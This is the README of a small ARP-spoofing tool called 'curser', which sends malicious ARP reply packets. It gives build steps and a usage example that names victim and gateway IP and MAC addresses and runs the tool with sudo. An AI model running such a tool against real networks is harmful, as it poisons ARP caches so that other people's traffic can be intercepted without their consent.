# curs>r
A small tool to send malicious arp reply packet

### Prerequisites
+ [CMake](http://www.cmake.org "CMake project page") (>= 3.17)

### Building
```bash
cd build
./builder.sh
```

### Usage
```bash
➜ ./curser -h
Usage: curser [OPTIONS]
OPTIONS:
	-ifn   interface name
	-vpa   victim ip
	-sha   sender mac address
	-gpa   gateway ip
	-gha   gateway mac address
  
➜ sudo ./curser -ifn en0 -vpa 192.168.0.22 -sha 00:AA:BB:CC:DD:EE -gpa 192.168.1.1 -gha 00:01:02:03:04:05
```
